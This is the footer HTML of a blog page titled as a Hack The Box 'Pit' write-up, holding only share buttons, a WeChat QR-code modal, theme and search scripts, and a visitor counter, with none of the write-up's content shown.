        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Pit - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACvUlEQVR42u3aMW7EMAwEwPz/0wmQKkVs71LSXQKMq4PPtjQqJILkx0d8fX5fP3//vHP1ZHI/eet+xA0XHh4e3mjqV9f9M1fg5JsJoJ3PL0uAh4eHd4yXHAZXA9/fSQ6G/Hiojx88PDy8t/ISUhLZJveTcfHw8PD+C6+d7v3v5Hk8PDy8v8lL0g1JYmIlaF5hb8i14OHh4cW8WQHsvb+P1/fw8PDwRlX1/LpP9bbHybZZ4eHh4Z3a8KJwdiX4zpuuZgv6MAoeHh7eAV4+5GxabSI4OWba8hseHh7eLt7KACcSvskiFgUwPDw8vGO89UTArCiVPz/8Ah4eHt5LeLNIPHlypTVh2ASGh4eH9xLebBJ7A+J8cYv8NB4eHt4m3iw92qYYckab1IiCbzw8PLwDvNnU2yaDZMQ8fdy2JuDh4eHt4rXtVi0sx+QtBUXLAh4eHt4xXlLQuh94veiVLNDmABoPDw9vxJsFynlRPw+jkxRtWzDDw8PDO8FrN+hZq8FKI1e+rFFIjYeHh7fMawPTNkHQhsizZMTDPPHw8PC28tpNeZZyTb6zkowoQmo8PDy8Tbz6JNm6ieewOvjGw8PDewlv1kawt3xVZJ3zNAQeHh7eJt7KATArYs2aGOrULR4eHt4xXl4Ay9uz2rdmJa7oLTw8PLwDvJX0QXsw5MfD3hAfDw8Pby8v3+jbFoEkls8xbXHuoacMDw8Pb4HXXu3WvCu8XpkbHh4e3l7e3iRCmwJO3soPpCikxsPDw1vmtdtuW7Zv0xnraV88PDy81/BmJa51wH0Ini/lw6zw8PDwjvGSNOssRds2Y81OsIeDAQ8PD++tvHwTz7+TU9uyHB4eHt57eXkxLH83+Tf52qUFDw8P7xgvT0Ykw+SheTuHJKReyrXg4eHhpbtxUQCbLcQsmdu2I2yo7+Hh4eHdffML0rr5PkIIKGAAAAAASUVORK5CYII=" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</body>
</html>
